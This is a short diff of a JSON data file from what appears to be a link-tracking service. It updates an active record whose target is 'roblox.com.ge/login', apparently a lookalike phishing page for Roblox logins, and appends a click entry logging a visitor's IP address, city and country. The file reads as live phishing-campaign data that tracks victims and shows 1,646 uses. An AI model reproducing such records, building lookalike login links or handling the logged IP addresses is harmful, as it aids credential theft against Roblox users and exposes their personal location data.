@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1645,
+    "useCount": 1646,
     "createdBy": "admin",
     "clicks": [
       {
@@ -13328,6 +13328,14 @@
         "city": "Machala",
         "flag": "🇪🇨",
         "countryCode": "EC"
+      },
+      {
+        "timestamp": 1777570890413,
+        "ip": "90.196.181.55",
+        "country": "United Kingdom",
+        "city": "Sheffield",
+        "flag": "🇬🇧",
+        "countryCode": "GB"
       }
     ]
   },
